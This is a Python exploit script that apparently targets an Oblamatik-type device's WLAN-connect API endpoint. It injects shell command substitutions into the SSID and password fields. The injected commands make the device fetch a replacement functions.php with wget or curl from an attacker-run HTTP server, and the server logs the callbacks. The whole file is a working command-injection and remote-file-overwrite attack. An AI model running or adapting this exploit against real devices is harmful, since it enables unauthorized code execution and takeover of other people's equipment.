import requests
import http.server
import socketserver
import threading
import time
import json

TARGET_IP = "192.168.1.173"
LOCAL_IP = "192.168.1.11"
PORT = 8000

# Function to start HTTP server to catch callbacks
def start_server():
    class RequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"\n[+] CALLBACK RECEIVED: {self.path}")
            # If callback is for functions.php, serve it?
            # Or just log success.
            if "functions.php" in self.path:
                print("[+] Serving functions.php payload...")
                # Here we could serve the actual file content if needed.
                # But for now, we just want to know if it executes.
                self.send_response(200)
                self.end_headers()
                with open("/Users/robertpsiurski/Documents/trae_projects/oblamatik/local_firmware_work/files_clean/www/inc/functions.php", "rb") as f:
                    self.wfile.write(f.read())
                return
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"PWNED")

    # Allow reuse of address
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"[+] Server listening on port {PORT}")
        httpd.timeout = 2
        start_time = time.time()
        # Run for 60 seconds to catch callbacks after network restart
        while time.time() - start_time < 60:
            httpd.handle_request()

def exploit():
    # Start server in background
    t = threading.Thread(target=start_server)
    t.daemon = True
    t.start()
    
    time.sleep(1)
    
    # Construct payload command
    # Try multiple tools: wget, curl, nc
    # We want to download functions.php to /www/inc/functions.php
    # Command: wget -O /www/inc/functions.php http://LOCAL:PORT/functions.php
    cmd_url = f"http://{LOCAL_IP}:{PORT}/functions.php"
    cmd = f"wget -O /www/inc/functions.php {cmd_url} || curl -o /www/inc/functions.php {cmd_url}"
    
    # Injection payload into password field (no quotes in template)
    # We inject into multiple options just in case
    injection = f"""dummy
option ifname '$({cmd})'
option macaddr '$({cmd})'
option bssid '$({cmd})'
option script '$({cmd})'
"""
    
    # Also try to break out of SSID quotes
    # 'myname'
    # becomes 'myname'
    # option ...
    ssid_injection = f"""exploit'
option ifname '$({cmd})'
option macaddr '$({cmd})'
option bssid '$({cmd})'
option script '$({cmd})'
option dummy '"""

    data = {
        'name': ssid_injection,
        'password': injection
    }
    
    print(f"[+] Sending exploit to {TARGET_IP}...")
    print(f"[+] Payload CMD: {cmd}")
    
    try:
        # Send JSON POST to wlan-connect.php
        # Note: API uses 'url=wlan/connect'
        requests.post(f"http://{TARGET_IP}/api/index.php?url=wlan/connect", json=data, timeout=5)
        print("[+] Request sent. Waiting for callbacks...")
    except requests.exceptions.ReadTimeout:
        print("[+] Request timed out (expected due to network restart). Waiting for callbacks...")
    except Exception as e:
        print(f"[-] Error sending request: {e}")

    # Wait for server thread to finish (it runs for 60s)
    time.sleep(60)

if __name__ == "__main__":
    exploit()
